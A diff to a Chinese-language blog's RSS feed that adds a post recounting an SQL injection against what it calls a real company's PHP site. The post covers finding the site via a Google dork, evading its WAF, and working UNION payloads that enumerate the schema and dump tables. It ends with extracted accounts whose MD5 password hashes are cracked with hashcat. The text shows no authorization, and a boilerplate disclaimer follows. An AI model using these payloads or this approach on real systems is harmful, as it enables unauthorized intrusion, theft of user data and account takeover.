@@ -7,7 +7,149 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>gucheNg</copyright>
-        <lastBuildDate>Tue, 10 Sep 2024 15:25:42 +0800</lastBuildDate><atom:link href="http://gucheng.me/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 11 Sep 2024 11:34:30 +0800</lastBuildDate><atom:link href="http://gucheng.me/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>记一次真实站点sql注入漏洞</title>
+        <link>http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
+        <pubDate>Wed, 11 Sep 2024 11:34:30 +0800</pubDate>
+        
+        <guid>http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
+        <description>&lt;h3 id=&#34;发现方式&#34;&gt;发现方式
+&lt;/h3&gt;&lt;p&gt;利用goole语法&lt;code&gt;inurl=&amp;quot;id=&amp;quot;&lt;/code&gt;发现某公司php站点，在id后输入&lt;code&gt;1&#39; and &#39;a&#39;=&#39;a&#39;--&lt;/code&gt;显示被waf拦截&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911115620840.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240911115620840&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这个waf我去搜了一下是西数的一个waf，挺拉的&lt;/p&gt;
+&lt;p&gt;经过尝试发现是空格被过滤了，于是将空格用+替换。输入&lt;code&gt;1&#39;+and+&#39;a&#39;=&#39;a&#39;--&lt;/code&gt;后页面报错，说明存在sql注入漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911115215785.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240911115215785&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;基本信息&#34;&gt;基本信息
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	?id=1+union+select+database()--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	?id=1+union+select+version()--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	?id=1+union+select+user()--
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;成功查询到当前库名：sanying&lt;/li&gt;
+&lt;li&gt;mysql版本：5.7.43&lt;/li&gt;
+&lt;li&gt;user：&lt;a class=&#34;link&#34; href=&#34;mailto:sanying@127.0.0.1&#34; &gt;sanying@127.0.0.1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这个版本是好多年前的了，高版本的用法不能在这用&lt;/p&gt;
+&lt;h3 id=&#34;查库&#34;&gt;查库
+&lt;/h3&gt;&lt;p&gt;在构造的时候又发现这个waf规则里面&lt;strong&gt;group_concat不能和括号连用&lt;/strong&gt;，所以我们只能用limit一条一条查&lt;/p&gt;
+&lt;p&gt;构造payload&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;?id=-1+union+select+schema_name+from+information_schema.schemata+limit+0,1--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发现只有两个库，其中一个还是系统库(°ー°〃)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911121133922.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240911121133922&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911121150852.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240911121150852&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看来只用脱sanying库就行了，系统库就不管了&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;查表&#34;&gt;查表
+&lt;/h3&gt;&lt;p&gt;构造payload&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;?id=-1+union+select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911121503106.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240911121503106&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;后面可以用用burp的攻击模块或者自己写个脚本提取，我选的后者。因为前者还要自己去把表名抄下来太麻烦，我根据页面回显利用python re库和正则将回显内容提取出来即可，最后发现有共&lt;strong&gt;17&lt;/strong&gt;张表&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;查列名&#34;&gt;查列名
+&lt;/h3&gt;&lt;p&gt;查列名的时候又发现不能指定数据库或者具体的表名来查，反正我们只脱一个库数据库名就可以一直用database(),表名就用子查询+limit n,1来指定，后续把n当作循环变量即可&lt;/p&gt;
+&lt;p&gt;构造payload&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;?id=-1+union+select+column_name+from+information_schema.columns+where+table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+n,1)+and+table_schema=database()+limit+0,1--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;然后写入脚本自动化查询每张表的列名&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911122645544.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240911122645544&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;查数据&#34;&gt;查数据
+&lt;/h3&gt;&lt;p&gt;到这里了开始我是想尽办法构造出列名，结果最后发现可以直接指定列名来查，不知道为什么，这个waf给我人整麻了 ╮(╯▽╰)╭&lt;/p&gt;
+&lt;p&gt;构造payload&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-1+union+select+{data[i]}+from+Sanying.{km}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这里是从脚本里面复制出来的，我是先把列名处理成列表&lt;/p&gt;
+&lt;p&gt;这里因为不太会协调这些数据的位置处理输出到xlsx，有些列还是空的，所以我只能半自动化手动填数据到excel，有大佬的话浇浇我！&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911123931868.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20240911123931868&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;成果&#34;&gt;成果
+&lt;/h3&gt;&lt;p&gt;最后就是这样，拿到了两个账号和一些信息，这库也是真的老了，十几年前的了，密码还是用的md5，但是最近又有人登录。后面利用hashcat和在线网站成功解出两个md5哈希，也算是稍有收获！&lt;/p&gt;
+&lt;p&gt;![68c8be9ac6e92351d64af7ad05e237be](C:\Users\天\Documents\Tencent Files\2477231995\nt_qq\nt_data\Pic\2024-09\Ori\68c8be9ac6e92351d64af7ad05e237be.png)&lt;/p&gt;
+&lt;h3 id=&#34;免责声明&#34;&gt;免责声明：
+&lt;/h3&gt;&lt;p&gt;目的：本文旨在分享有关网络安全渗透知识的信息，以促进对网络安全的理解和提高个人和组织的安全意识。这些知识和技术应仅用于合法的、授权的安全测试和红队操作，并遵守适用的法律和道德规范。&lt;/p&gt;
+&lt;p&gt;法律合规：在参考本文所提供的渗透测试和攻击技术时，请确保遵守您所在国家或地区的法律法规。未经合法授权和明确许可，禁止使用这些知识和技术从事非法活动，如未经授权的入侵、数据盗取、破坏性攻击等。&lt;/p&gt;
+&lt;p&gt;责任限制：使用本文所提供的信息和技术的过程中，如因操作不当或其他原因导致任何损失或损害，作者概不负责。使用者应自行承担所有风险和后果。&lt;/p&gt;
+&lt;p&gt;免责声明：本文的分享仅为技术交流和学习之用，并不鼓励任何非法活动。作者不对任何个人或组织的非法行为承担任何责任。&lt;/p&gt;
+&lt;p&gt;出事与作者无关：使用者在运用本文提供的知识和技术时，应自行判断和承担责任。如因使用者违反法律法规或滥用本文提供的知识和技术而导致任何问题、损失或法律责任，与作者无关。使用者应对其行为负完全责任。&lt;/p&gt;
+&lt;p&gt;合法授权：在进行安全测试和渗透测试时，使用者应首先获得相关系统和网络的合法授权，确保测试的对象是属于您合法所有或得到明确授权的。&lt;/p&gt;
+&lt;p&gt;持续学习：网络安全是一个不断发展和演变的领域，本文提供的知识和技术可能随时间而过时或失效。使用者应不断学习和更新知识，关注最新的安全趋势、漏洞和防护措施。&lt;/p&gt;
+&lt;p&gt;通过阅读和使用本文提供的信息和技术，视为您理解并同意以上免责声明，并同意自行承担使用这些知识和技术所产生的风险和后果。作者对任何不当使用所导致的问题、损失或法律责任概不负责。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>BaseCTF招新赛-Misc-wp</title>
         <link>http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/</link>
         <pubDate>Tue, 10 Sep 2024 15:25:42 +0800</pubDate>
